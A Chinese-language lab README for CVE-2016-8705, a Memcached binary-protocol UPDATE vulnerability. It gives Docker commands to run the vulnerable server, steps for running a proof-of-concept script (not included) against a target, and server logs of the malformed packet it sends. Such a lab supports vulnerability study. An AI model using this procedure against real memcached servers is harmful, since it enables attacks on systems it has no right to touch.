## Memcached Server UPDATE 远程代码执行漏洞(CVE-2016-8705)环境

### 说明

 感谢 [@xing-xiao](https://github.com/xing-xiao) 提供原始环境。 #6

### 漏洞信息

 * [CVE-2106-8705漏洞信息](http://www.talosintelligence.com/reports/TALOS-2016-0220/)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:m_memcached_CVE-2016-8705
 ```

2. 启动环境

 ```
$ docker run -d -p 11211:11211 medicean/vulapps:m_memcached_CVE-2016-8705
 ```

### 使用国内阿里云镜像

1. 拉取镜像到本地

 ```
$ docker pull registry.cn-hangzhou.aliyuncs.com/lo0o/memcached:1.4.32
 ```

2. 启动环境

 ```
$ docker run -d -p 11211:11211 registry.cn-hangzhou.aliyuncs.com/lo0o/memcached:1.4.32
 ```

### PoC

1. 获取目标 IP 地址与端口号，如：192.168.100.2 端口号为 11211

2. `docker ps` 查看容器ID（如获得的ID为：cfd94f8d5f93）

  附加 memcached 进程用于监测结果：

 ```
$ docker attach cfd94f8d5f93
 ```

3. 执行 poc.py

```
$ python poc.py 192.168.100.2 11211
```

4. 查看结果

```
<36 new auto-negotiating client connection
36: Client using the binary protocol
<36 Read binary protocol data:
<36    0x80 0x02 0x00 0xfa
<36    0x08 0x00 0x00 0x00
<36    0xff 0xff 0xff 0xd0
<36    0x00 0x00 0x00 0x00
<36    0x00 0x00 0x00 0x00
<36    0x00 0x00 0x00 0x00
<36 ADD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Value len is -306
Invalid rlbytes to read: len -306
<36 connection closed.
```

> 注意：
>
> 漏洞详细信息处的结果为Exp执行效果，该 PoC 并不会造成服务端崩溃。

### Exp

> 暂无命令执行 Exp，如果你愿意分享该 Exp 可向本仓库发起 [Pull Request](https://github.com/Medicean/VulApps/compare)
